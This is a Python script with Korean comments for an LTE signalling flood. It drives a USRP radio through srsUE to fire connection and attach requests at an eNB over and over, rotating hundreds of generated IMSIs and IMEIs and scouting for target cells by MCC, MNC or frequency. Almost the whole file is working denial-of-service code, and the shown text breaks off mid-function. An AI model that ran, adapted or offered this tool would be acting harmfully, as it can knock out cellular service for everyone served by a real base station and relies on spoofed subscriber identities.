#!/usr/bin/env python3
"""
LTE Flooding Script
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import time
import signal
import sys
import os
import re
from typing import Optional
import argparse
import logging
from pathlib import Path

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class LTEFlooder:
    """LTE 연결 요청 flooding을 수행하는 클래스"""
    
    def __init__(self, usrp_args: str, 
                 interval: float = 0.1, srsue_config: str = "srsue.conf",
                 mcc: Optional[int] = None, mnc: Optional[int] = None,
                 earfcn: Optional[int] = None, instances: int = 1,
                 use_configs: bool = False):
        """
        Args:
            usrp_args: USRP 장치 인자 (예: "serial=30AD123")
            interval: 각 연결 시도 사이의 간격 (초)
            srsue_config: srsUE 설정 파일 경로
            mcc: Mobile Country Code (예: 123)
            mnc: Mobile Network Code (예: 456)
            earfcn: 주파수 채널 번호 (예: 3400)
            instances: 동시에 실행할 프로세스 수 (기본값: 1)
            use_configs: ue_configs 폴더의 모든 config 파일 사용 여부
        """
        self.usrp_args = usrp_args
        self.interval = interval
        self.srsue_config = srsue_config
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.instances = instances
        self.use_configs = use_configs
        self.processes: list[Optional[subprocess.Popen]] = []  # 여러 프로세스 관리
        self.process: Optional[subprocess.Popen] = None  # 단일 프로세스 (일부 모드에서 사용)
        self.running = False
        
        # .env 파일에서 USIM 키 로드
        self.usim_opc, self.usim_k = self._load_usim_keys()
        
        # 실행 횟수 카운터 (매번 다른 IMSI/IMEI 생성을 위해)
        self.attempt_count = 0
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        # 환경변수에서 먼저 확인
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        # .env 파일에서 로드
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        # .env 파일이나 환경변수에서 값을 찾지 못한 경우
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            logger.error("예제: .env 파일에 'USIM_OPC=...' 및 'USIM_K=...' 추가")
            raise ValueError("USIM 키가 설정되지 않았습니다. .env 파일을 확인하세요.")
        
        return opc, k
    
    def check_usrp_connection(self) -> bool:
        """USRP 장치 연결 확인"""
        logger.info("USRP 장치 연결 확인 중...")
        
        try:
            # uhd_find_devices로 장치 확인
            result = subprocess.run(
                ["uhd_find_devices"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # 시리얼 번호 추출
            serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
            if serial_match:
                found_serial = serial_match.group(1)
                # 사용자가 지정한 시리얼 추출
                user_serial_match = re.search(r'serial=([^\s"]+)', self.usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
                
                if user_serial and found_serial.upper() == user_serial.upper():
                    logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                    return True
                elif user_serial:
                    logger.warning(f"지정한 시리얼({user_serial})과 발견된 시리얼({found_serial})이 다릅니다")
                    logger.info(f"발견된 장치 사용: serial={found_serial}")
                    return True
                else:
                    # 시리얼이 지정되지 않았으면 첫 번째 장치 사용
                    logger.info(f"✓ USRP 장치 발견: serial={found_serial}")
                    return True
            
            # srsUE로 직접 확인 시도
            test_config = self.create_ue_config(0)
            test_cmd = [
                "srsue",
                test_config,
                "--log.all_level", "error",
                "--log.filename", "/dev/null"
            ]
            
            test_process = subprocess.Popen(
                test_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # 3초 동안 실행하여 연결 확인
            time.sleep(3)
            
            if test_process.poll() is None:
                # 프로세스가 실행 중이면 연결 성공 가능성
                test_process.terminate()
                test_process.wait(timeout=2)
                logger.info("✓ USRP 장치 연결 확인됨 (srsUE 실행 가능)")
                # 테스트 config 파일 삭제
                if os.path.exists(test_config):
                    os.remove(test_config)
                return True
            else:
                # 프로세스가 종료되었으면 오류 확인
                _, stderr = test_process.communicate()
                if "error" in stderr.lower() or "failed" in stderr.lower():
                    logger.error("✗ USRP 장치 연결 실패")
                    logger.error(f"오류: {stderr[:200]}")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return False
                else:
                    logger.info("✓ USRP 장치 연결 확인됨")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return True
                    
        except subprocess.TimeoutExpired:
            logger.warning("USRP 확인 시간 초과")
            return False
        except FileNotFoundError:
            logger.error("✗ srsUE를 찾을 수 없습니다. srsRAN이 설치되어 있는지 확인하세요.")
            return False
        except Exception as e:
            logger.warning(f"USRP 확인 중 오류: {e}")
            return False
        
    def create_ue_config(self, unique_id: int) -> str:
        """고유한 설정 파일 생성 (매번 다른 IMSI/IMEI)"""
        # EARFCN 설정 (주파수)
        # 주파수를 지정하지 않고 MCC/MNC만 지정한 경우, 주파수 스캔을 비활성화
        # (srsUE가 자동으로 모든 주파수를 스캔하도록)
        if self.earfcn is not None:
            earfcn_value = self.earfcn
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        elif (self.mcc is not None or self.mnc is not None):
            # MCC/MNC만 지정하고 주파수를 지정하지 않은 경우
            # 주파수 라인을 주석 처리하여 자동 스캔 활성화
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
            earfcn_value = "자동 스캔"
        else:
            # 둘 다 지정하지 않은 경우 기본값 사용
            earfcn_value = 3400
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        
        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지, 최대 15자리)
        # MCC/MNC는 IMSI에서 자동으로 추출되므로 config 파일에 별도로 지정하지 않음
        # unique_id를 사용하여 매번 다른 IMSI 생성
        if self.mcc is not None and self.mnc is not None:
            # 둘 다 지정된 경우
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        elif self.mcc is not None:
            # MCC만 지정된 경우 (MNC는 기본값 01 사용)
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"{self.mcc:03d}01{unique_id:010d}"
        elif self.mnc is not None:
            # MNC만 지정된 경우 (MCC는 기본값 001 사용)
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        else:
            # 둘 다 지정되지 않은 경우
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"00101{unique_id:010d}"
        
        # device_args는 config 파일에 넣지 않고 명령어 옵션으로 전달
        # IMEI 포맷팅 (6자리, 앞에 0 채우기)
        imei_suffix = f"{unique_id:06d}"
        config_content = f"""[rf]
device_name = uhd
tx_gain = 90
rx_gain = 60
nof_antennas = 1

[rat.eutra]
{earfcn_line}
nof_carriers = 1

[usim]
mode = soft
algo = milenage
opc  = {self.usim_opc}
k    = {self.usim_k}
imsi = {imsi}
imei = 353490069873{imei_suffix}

[pcap]
enable = true
mac_filename = /tmp/srsue_{unique_id}_mac.pcap
nas_filename = /tmp/srsue_{unique_id}_nas.pcap
"""
        config_path = f"srsue_{unique_id}.conf"
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def generate_configs_batch(self, count: int = 500, output_dir: str = "ue_configs"):
        """대량의 config 파일을 미리 생성"""
        import shutil
        
        # 기존 폴더가 있으면 비우기
        if os.path.exists(output_dir):
            logger.info(f"{output_dir} 폴더를 비우는 중...")
            try:
                shutil.rmtree(output_dir)
            except Exception as e:
                logger.error(f"폴더 삭제 오류: {e}")
        
        # 폴더 생성
        os.makedirs(output_dir, exist_ok=True)
        
        logger.info(f"{count}개의 config 파일을 {output_dir} 폴더에 생성 중...")
        config_files = []
        
        for i in range(1, count + 1):
            # output_dir에 직접 생성
            config_path = self._create_ue_config_in_dir(i, output_dir)
            config_files.append(config_path)
            
            if i % 50 == 0:
                logger.info(f"진행 중... {i}/{count} 생성 완료")
        
        logger.info(f"✓ {count}개의 config 파일 생성 완료: {output_dir}/")
        return config_files
    
    def _create_ue_config_in_dir(self, unique_id: int, output_dir: str) -> str:
        """지정된 디렉토리에 config 파일 생성"""
        # EARFCN 설정 (주파수)
        if self.earfcn is not None:
            earfcn_value = self.earfcn
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        elif (self.mcc is not None or self.mnc is not None):
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
            earfcn_value = "자동 스캔"
        else:
            earfcn_value = 3400
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        
        # IMSI 생성 (MCC/MNC는 IMSI에서 자동으로 추출되므로 config 파일에 별도로 지정하지 않음)
        if self.mcc is not None and self.mnc is not None:
            mnc_digits = 3 if self.mnc >= 100 else 2
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        elif self.mcc is not None:
            imsi = f"{self.mcc:03d}01{unique_id:010d}"
        elif self.mnc is not None:
            mnc_digits = 3 if self.mnc >= 100 else 2
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        else:
            imsi = f"00101{unique_id:010d}"
        
        # device_args는 config 파일에 넣지 않고 명령어 옵션으로 전달
        # IMEI 포맷팅 (6자리, 앞에 0 채우기)
        imei_suffix = f"{unique_id:06d}"
        config_content = f"""[rf]
device_name = uhd
tx_gain = 90
rx_gain = 60
nof_antennas = 1

[rat.eutra]
{earfcn_line}
nof_carriers = 1

[usim]
mode = soft
algo = milenage
opc  = {self.usim_opc}
k    = {self.usim_k}
imsi = {imsi}
imei = 353490069873{imei_suffix}

[pcap]
enable = true
mac_filename = /tmp/srsue_{unique_id}_mac.pcap
nas_filename = /tmp/srsue_{unique_id}_nas.pcap
"""
        config_path = os.path.join(output_dir, f"srsue_{unique_id}.conf")
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def get_config_files(self, config_dir: str = "ue_configs") -> list[str]:
        """ue_configs 폴더에서 모든 config 파일 목록 가져오기"""
        config_files = []
        if os.path.exists(config_dir) and os.path.isdir(config_dir):
            for file in os.listdir(config_dir):
                if file.endswith('.conf'):
                    config_files.append(os.path.join(config_dir, file))
        return sorted(config_files)
    
    def get_usrp_args_from_config(self, config_path: str) -> Optional[str]:
        """config 파일에서 device_args 읽어오기"""
        try:
            with open(config_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('device_args'):
                        # device_args = serial=34C78E4 형식
                        if '=' in line:
                            value = line.split('=', 1)[1].strip()
                            return value
        except:
            pass
        # 읽지 못하면 None 반환 (기본 장치 사용)
        return None
    
    def get_config_values(self, config_path: str) -> dict:
        """config 파일에서 모든 설정 값 읽어오기"""
        values = {
            'usrp_args': None,
            'mcc': None,
            'mnc': None,
            'earfcn': None
        }
        try:
            with open(config_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'device_args':
                            values['usrp_args'] = value
                        elif key == 'mcc':
                            try:
                                values['mcc'] = int(value)
                            except:
                                pass
                        elif key == 'mnc':
                            try:
                                values['mnc'] = int(value)
                            except:
                                pass
                        elif key == 'dl_earfcn':
                            try:
                                values['earfcn'] = int(value)
                            except:
                                pass
        except:
            pass
        return values
    
    def run_srsue_with_config(self, config_path: str, log_file: str = None, usrp_args: str = None) -> subprocess.Popen:
        """단일 config 파일로 srsue 실행"""
        # config 파일 경로를 절대 경로로 변환
        if not os.path.isabs(config_path):
            config_path = os.path.abspath(config_path)
        
        if log_file is None:
            log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
        
        # config 파일 존재 확인
        if not os.path.exists(config_path):
            raise FileNotFoundError(f"Config 파일을 찾을 수 없습니다: {config_path}")
        
        # config 파일에서 device_args 읽기 (없으면 usrp_args 파라미터 사용)
        device_args = usrp_args
        if device_args is None:
            device_args = self.get_usrp_args_from_config(config_path)
        
        logger.debug(f"srsue 실행: config={config_path}, log={log_file}, device_args={device_args}")
        
        cmd = [
            "srsue",
            config_path,
            "--log.filename", log_file,
            "--log.all_level", "info"
        ]
        
        # device_args를 명령어 옵션으로 추가
        if device_args:
            cmd.extend(["--rf.device_args", device_args])
        
        kwargs = {
            'stdout': subprocess.PIPE,
            'stderr': subprocess.PIPE,
        }
        if hasattr(os, 'setsid'):
            kwargs['preexec_fn'] = os.setsid
        elif sys.platform == 'darwin':
            kwargs['start_new_session'] = False
        
        return subprocess.Popen(cmd, **kwargs)
    
    def run_flooding_with_configs(self):
        """ue_configs 폴더의 모든 config 파일로 순차적으로 빠르게 실행 (하나의 USRP 사용)"""
        # ue_configs 폴더에서 config 파일 가져오기
        config_files = self.get_config_files()
        if not config_files:
            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
            return
        
        # 첫 번째 config 파일에서 설정 읽어오기
        config_values = self.get_config_values(config_files[0])
        usrp_args_from_config = config_values['usrp_args']
        if usrp_args_from_config:
            logger.info(f"Config 파일에서 USRP 인자 읽음: {usrp_args_from_config}")
        else:
            logger.info("Config 파일에 USRP 인자가 없습니다. 기본 장치 사용")
        
        # 먼저 하나의 srsue로 eNB 찾기 (첫 번째 config 파일을 그대로 사용)
        scout_config_file = config_files[0]
        logger.info(f"eNB 탐색 중... (사용하는 config: {scout_config_file})")
        
        # config 파일 내용 확인 (디버깅)
        try:
            with open(scout_config_file, 'r') as f:
                config_preview = f.read(500)  # 처음 500자만
                logger.debug(f"Config 파일 내용 (처음 500자):\n{config_preview}")
        except:
            pass
        
        scout_log = "/tmp/srsue_scout.log"
        # 이전 로그 파일 삭제 (오래된 내용으로 인한 오탐지 방지)
        if os.path.exists(scout_log):
            try:
                os.remove(scout_log)
            except:
                pass
        
        # usrp_args 전달 (config 파일에서 읽은 값 또는 기본값)
        scout_usrp_args = usrp_args_from_config or self.usrp_args
        scout_process = self.run_srsue_with_config(scout_config_file, scout_log, scout_usrp_args)
        
        enb_found = False
        start_time = time.time()
        max_wait_time = 60  # 최대 60초 대기
        
        # eNB 찾기 대기
        last_log_size = 0
        while self.running and not enb_found and (time.time() - start_time) < max_wait_time:
            if scout_process.poll() is not None:
                # 프로세스가 종료됨 - 오류 확인
                return_code = scout_process.returncode
                logger.warning(f"스카우트 프로세스가 종료되었습니다 (종료 코드: {return_code})")
                
                # stderr 확인
                try:
                    _, stderr = scout_process.communicate()
                    if stderr:
                        logger.error(f"스카우트 프로세스 오류: {stderr[:500]}")
                except:
                    pass
                break
            
            if os.path.exists(scout_log):
                try:
                    with open(scout_log, 'r', encoding='utf-8', errors='ignore') as f:
                        log_content = f.read()
                    
                    # 로그가 업데이트되었는지 확인
                    current_log_size = len(log_content)
                    if current_log_size > last_log_size:
                        last_log_size = current_log_size
                        # 마지막 10줄 출력 (디버깅)
                        log_lines = log_content.split('\n')
                        if len(log_lines) > 10:
                            elapsed = time.time() - start_time
                            # 10초마다 한 번씩 로그 출력
                            if elapsed % 10 < 0.5:
                                logger.info(f"스카우트 로그 (경과 시간: {elapsed:.1f}초):")
                                for line in log_lines[-5:]:  # 마지막 5줄만
                                    if line.strip():
                                        logger.info(f"  {line[:150]}")
                    
                    # eNB 찾았는지 확인 (실제로 셀을 찾았을 때만 매칭)
                    # 부정적인 키워드 확인 (셀을 찾지 못했거나 연결 실패)
                    no_cell_found = any(keyword in log_content.lower() for keyword in [
                        'could not find any cell',
                        'no cell found',
                        'no more frequencies',
                        'did not find any plmn',
                        'completed with failure',
                        'cell search completed. no cells found',
                        'found pss but could not decode pbch',  # PBCH 디코딩 실패 = 연결 실패
                        'could not decode pbch'  # PBCH 디코딩 실패
                    ])
                    
                    # 긍정적인 키워드 확인 (실제로 셀을 찾았을 때)
                    cell_found_positive = any(keyword in log_content.lower() for keyword in [
                        'found plmn id',
                        'found cell with pci',
                        'detected cell with pci',
                        'synchronized to cell',
                        'cell found with pci',
                        'rrc connection request',
                        'random access',
                        'rach',
                        'attach request',
                        'sending rrc',
                        'rrc connected',
                        'found peak',  # CELL SEARCH에서 셀을 찾았을 때
                        'cell_id:',  # Cell ID 발견
                        'found peak psr',  # PSR peak 발견
                        'cell search: ['  # CELL SEARCH 결과 (예: [3/6/4])
                    ])
                    
                    # 실제 연결 시도가 있었는지 확인 (RRC connection request, random access 등)
                    actual_connection_attempt = any(keyword in log_content.lower() for keyword in [
                        'rrc connection request',
                        'random access',
                        'rach',
                        'attach request',
                        'sending rrc',
                        'rrc connected',
                        'synchronized to cell'
                    ])
                    
                    # "found peak"와 "cell_id:"가 함께 있고, PBCH 디코딩 실패가 없으며, 실제 연결 시도가 있으면 셀을 찾은 것
                    found_peak_with_cell_id = ('found peak' in log_content.lower() and 'cell_id:' in log_content.lower() 
                                               and 'could not decode pbch' not in log_content.lower()
                                               and actual_connection_attempt)
                    
                    # 부정적인 키워드가 없고 긍정적인 키워드가 있으면 셀을 찾은 것
                    cell_found = (cell_found_positive and not no_cell_found) or found_peak_with_cell_id
                    
                    # 디버깅: 매칭된 키워드 확인
                    if cell_found_positive or found_peak_with_cell_id:
                        matched_keywords = [kw for kw in [
                            'found plmn id', 'found cell with pci', 'detected cell with pci',
                            'synchronized to cell', 'cell found with pci', 'rrc connection request',
                            'random access', 'rach', 'attach request', 'sending rrc', 'rrc connected',
                            'found peak', 'cell_id:', 'found peak psr', 'cell search: ['
                        ] if kw in log_content.lower()]
                        if matched_keywords:
                            logger.info(f"셀 발견 키워드 매칭: {matched_keywords}")
                            if found_peak_with_cell_id:
                                logger.info("✓ 'Found peak'와 'Cell_id:' 발견 - 셀을 찾았습니다!")
                    
                    if cell_found:
                        enb_found = True
                        logger.info("✓ eNB를 찾았습니다! 모든 config 파일로 순차 공격 시작...")
                        # 찾은 셀 정보 출력
                        for line in log_content.split('\n'):
                            if any(keyword in line.lower() for keyword in ['plmn', 'pci', 'cell', 'found']):
                                logger.info(f"셀 정보: {line[:200]}")
                        break
                except Exception as e:
                    logger.debug(f"로그 파일 읽기 오류: {e}")
            else:
                # 로그 파일이 아직 생성되지 않음
                elapsed = time.time() - start_time
                if elapsed > 5 and elapsed % 5 < 0.5:  # 5초마다 한 번만 출력
                    logger.debug(f"로그 파일 대기 중... ({elapsed:.1f}초 경과)")
            
            time.sleep(0.5)
        
        # 스카우트 프로세스 종료
        if scout_process.poll() is None:
            scout_process.terminate()
            try:
                scout_process.wait(timeout=2)
            except:
                scout_process.kill()
        
        if not enb_found:
            logger.warning("eNB를 찾지 못했습니다. 재시도합니다...")
            if self.running:
                time.sleep(1)
                self.run_flooding_with_configs()
            return
        
        # ue_configs 폴더에서 모든 config 파일 가져오기
        config_files = self.get_config_files()
        if not config_files:
            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
            return
        
        logger.info(f"{len(config_files)}개의 config 파일로 순차 공격 시작 (하나의 USRP 사용)...")
        
        # 모든 config 파일을 순차적으로 빠르게 실행
        config_index = 0
        current_process = None
        
        try:
            while self.running:
                # 현재 프로세스가 없거나 종료되었으면 다음 config 실행
                if current_process is None or current_process.poll() is not None:
                    # 이전 프로세스가 있으면 정리
                    if current_process and current_process.poll() is None:
                        try:
                            current_process.terminate()
                            current_process.wait(timeout=1)
                        except:
                            current_process.kill()
                    
                    # 다음 config 파일로 실행
                    if config_index >= len(config_files):
                        # 모든 config를 다 사용했으면 처음부터 다시
                        config_index = 0
                    
                    config_path = config_files[config_index]
                    log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
                    
                    try:
                        # usrp_args 전달 (스카우트에서 사용한 것과 동일)
                        current_process = self.run_srsue_with_config(config_path, log_file, scout_usrp_args)
                        config_index += 1
                        logger.debug(f"Config 실행: {os.path.basename(config_path)} ({config_index}/{len(config_files)})")
                    except Exception as e:
                        logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
                        config_index += 1
                        continue
                
                # 연결 요청을 보냈는지 확인 (RRC connection request 등)
                if current_process and os.path.exists(log_file):
                    try:
                        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                            log_content = f.read()
                        
                        # 연결 요청을 보냈는지 확인
                        request_sent = any(keyword in log_content.lower() for keyword in [
                            'rrc connection request',
                            'random access',
                            'rach',
                            'attach request'
                        ])
                        
                        if request_sent:
                            # 연결 요청을 보냈으면 즉시 종료하고 다음 config로
                            if current_process.poll() is None:
                                current_process.terminate()
                                try:
                                    current_process.wait(timeout=0.5)
                                except:
                                    current_process.kill()
                            current_process = None
                            # 다음 config로 즉시 이동 (기다리지 않음)
                            continue
                    except:
                        pass
                
                # 짧은 대기 후 다시 확인
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            pass
        finally:
            # 정리
            if current_process and current_process.poll() is None:
                try:
                    current_process.terminate()
                    current_process.wait(timeout=1)
                except:
                    current_process.kill()
    
    def run_flooding(self):
        """srsUE 실행 (연결 성공 시 즉시 종료하여 빠른 재연결, 매번 다른 IMSI/IMEI)"""
        log_file = "srsue_flooding.log"
        
        while self.running:
            # 매번 새로운 고유 ID 생성 (다른 핸드폰처럼)
            self.attempt_count += 1
            unique_id = self.attempt_count
            config_path = self.create_ue_config(unique_id)
            
            try:
                logger.info(f"연결 시도 중... (시도 {self.attempt_count}, IMSI 범위: {unique_id})")
                cmd = [
                    "srsue",
                    config_path,
                    "--log.filename", log_file,
                    "--log.all_level", "info"
                ]
                
                # macOS와 Linux 호환성을 위한 프로세스 그룹 설정
                kwargs = {
                    'stdout': subprocess.PIPE,
                    'stderr': subprocess.PIPE,
                }
                # macOS에서는 setsid가 없으므로 조건부로 추가
                if hasattr(os, 'setsid'):
                    kwargs['preexec_fn'] = os.setsid
                elif sys.platform == 'darwin':
                    # macOS에서는 process group을 다르게 처리
                    kwargs['start_new_session'] = False
                
                process = subprocess.Popen(cmd, **kwargs)
                
                self.process = process
                
                # 연결 성공 감지를 위한 로그 모니터링
                connection_success = False
                enb_found = False
                start_time = time.time()
                max_wait_time = 30  # 최대 30초 대기 (연결 시도 시간)
                last_log_check = start_time
                process_exited_early = False
                process_stderr = None
                
                # 연결 성공 후에는 타임아웃 없이 계속 실행
                while process.poll() is None:
                    # 연결 성공 전에는 타임아웃 체크, 성공 후에는 무한 실행
                    if not connection_success and (time.time() - start_time) >= max_wait_time:
                        break
                    current_time = time.time()
                    elapsed = current_time - start_time
                    
                    # 로그 파일에서 연결 성공 여부 확인 (연결 성공 후에는 최소한만 체크)
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                log_content = f.read()
                            
                            # 연결 성공 후에는 로그 체크를 최소화 (프로세스 상태만 확인)
                            if connection_success:
                                # 연결 성공 후에는 추가 로그 체크 없이 계속 실행
                                time.sleep(1)  # 1초 대기 후 다시 체크
                                continue
                            
                            # eNB 찾았는지 확인 (셀 탐색 단계) - 연결 성공 전에만 실행
                            # "No cell found" 같은 부정 메시지가 없고, 실제로 셀을 찾았는지 확인
                            no_cell_found = any(keyword in log_content.lower() for keyword in [
                                'no cell found',
                                'could not find any cell',
                                'no more frequencies',
                                'cell search: no cell'
                            ])
                            
                            # 실제로 셀을 찾았는지 확인 (더 구체적인 키워드)
                            cell_found_positive = any(keyword in log_content.lower() for keyword in [
                                'found plmn',
                                'found cell',  # "Found Cell:" 메시지
                                'cell found with pci',
                                'detected cell with pci',
                                'synchronized to cell',
                                'rrc connection request',  # RRC 요청을 보냈다면 셀을 찾은 것
                                'connection request',  # 연결 요청을 보냈다면 셀을 찾은 것
                                'sending rrc',
                                'rrc connection setup',
                                'random access',  # Random Access 시도 = 셀을 찾은 것
                                'rach',  # RACH 요청 = 셀을 찾은 것
                                'rrc connected',  # RRC 연결 성공
                                'attaching ue'  # UE 연결 시도 중
                            ])
                            
                            if not enb_found and cell_found_positive and not no_cell_found:
                                enb_found = True
                                logger.info(f"셀을 찾았습니다! (소요 시간: {elapsed:.1f}초)")
                            elif not enb_found and no_cell_found and not connection_success:
                                # 셀을 찾지 못했다는 명확한 메시지 (연결 성공 전에만 출력)
                                if elapsed % 5.0 < 0.5:  # 5초마다 한 번만 출력
                                    logger.warning(f"셀을 찾지 못했습니다 (소요 시간: {elapsed:.1f}초) - 주파수 스캔 중...")
                            
                            # RRC 연결 시도 확인
                            rrc_attempted = any(keyword in log_content.lower() for keyword in [
                                'rrc connection request',
                                'rrc connection setup',
                                'sending rrc',
                                'rrc connection'
                            ])
                            
                            # NAS 메시지 확인
                            nas_attempted = any(keyword in log_content.lower() for keyword in [
                                'attach request',
                                'nas message',
                                'sending nas'
                            ])
                            
                            # 연결 성공 키워드 확인 (연결 성공 후 계속 유지하여 패킷 전송)
                            if any(keyword in log_content.lower() for keyword in [
                                'rrc connection setup complete',
                                'rrc connected',
                                'random access complete',  # RACH 성공 = 연결 시도 성공
                                'attached',
                                'registered',
                                'attach accept'
                            ]):
                                if not connection_success:
                                    connection_success = True
                                    logger.info(f"연결 성공했습니다! 연결을 유지하며 패킷을 계속 전송합니다. (소요 시간: {elapsed:.1f}초)")
                                # 연결 성공 후 종료하지 않고 계속 실행 (연결 유지)
                                # 프로세스는 계속 실행되어 패킷을 보냄
                                
                                
                        except:
                            pass
                    
                    # 5초마다 진행 상황 로그 (너무 많이 출력되지 않도록)
                    if current_time - last_log_check >= 5.0:
                        if not enb_found:
                            logger.debug(f"eNB 탐색 중... ({elapsed:.1f}초 경과)")
                        last_log_check = current_time
                    
                    time.sleep(0.5)  # 0.5초마다 로그 확인
                
                # 프로세스가 조기 종료되었는지 확인
                if process.poll() is not None and (time.time() - start_time) < max_wait_time:
                    process_exited_early = True
                    return_code = process.returncode
                    
                    # 로그 파일에서 에러 메시지 확인
                    error_found = False
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                log_lines = f.readlines()
                                # 마지막 30줄에서 에러 확인 (더 많은 컨텍스트)
                                for line in log_lines[-30:]:
                                    line_lower = line.lower()
                                    if any(keyword in line_lower for keyword in [
                                        'error', 'failed', 'fatal', 'exception', 'could not', 'unable to',
                                        'authentication failure', 'authentication reject', 'attach reject',
                                        'security mode reject', 'rrc connection reject', 'nas reject',
                                        'reject', 'authentication failed'
                                    ]):
                                        error_found = True
                                        logger.error(f"프로세스가 에러로 종료되었습니다 (종료 코드: {return_code})")
                                        logger.error(f"에러 메시지: {line.strip()[:300]}")
                                        # 추가 컨텍스트 출력 (이전/다음 줄)
                                        line_idx = log_lines.index(line)
                                        if line_idx > 0:
                                            logger.error(f"이전 컨텍스트: {log_lines[line_idx-1].strip()[:200]}")
                                        if line_idx < len(log_lines) - 1:
                                            logger.error(f"다음 컨텍스트: {log_lines[line_idx+1].strip()[:200]}")
                                        break
                        except:
                            pass
                    
                    # stderr 확인 (프로세스가 이미 종료되었으므로 읽기 가능)
                    if not error_found:
                        try:
                            if process.stderr:
                                # 프로세스가 종료되었으므로 stderr 읽기 시도
                                process.stderr.seek(0)
                                process_stderr = process.stderr.read()
                                if process_stderr and len(process_stderr) > 0:
                                    error_msg = process_stderr[:300].decode('utf-8', errors='ignore') if isinstance(process_stderr, bytes) else process_stderr[:300]
                                    if any(keyword in error_msg.lower() for keyword in ['error', 'failed', 'fatal', 'exception']):
                                        logger.error(f"프로세스가 에러로 종료되었습니다 (종료 코드: {return_code})")
                                        logger.error(f"에러 메시지: {error_msg.strip()}")
                        except (AttributeError, OSError, ValueError):
                            # stderr가 읽을 수 없는 경우 (이미 닫혔거나 seek 불가능)
                            pass
                
                # 프로세스가 종료되었는지 확인 (while 루프를 빠져나왔으므로 프로세스가 종료됨)
                elapsed_time = time.time() - start_time
                
                # 프로세스가 아직 실행 중이면 (타임아웃으로 루프를 빠져나온 경우) 종료
                if process.poll() is None:
                    if not connection_success:
                        # 연결 실패 시 프로세스 종료
                        process.terminate()
                        try:
                            process.wait(timeout=2)
                        except subprocess.TimeoutExpired:
                            process.kill()
                            process.wait()
                    else:
                        # 연결 성공했는데 프로세스가 아직 실행 중이면 계속 실행
                        # (이 경우는 거의 없지만 안전을 위해)
                        logger.info(f"연결 유지 중... (실행 시간: {elapsed_time:.1f}초)")
                        try:
                            process.wait()  # 프로세스가 종료될 때까지 대기
                        except:
                            pass
                
                # 프로세스 종료 후 config 파일 삭제
                if os.path.exists(config_path):
                    try:
                        os.remove(config_path)
                    except:
                        pass
                
                # 결과 로깅
                if connection_success:
                    logger.info(f"연결이 끊어졌습니다. 재연결합니다...")
                elif process_exited_early:
                    if enb_found:
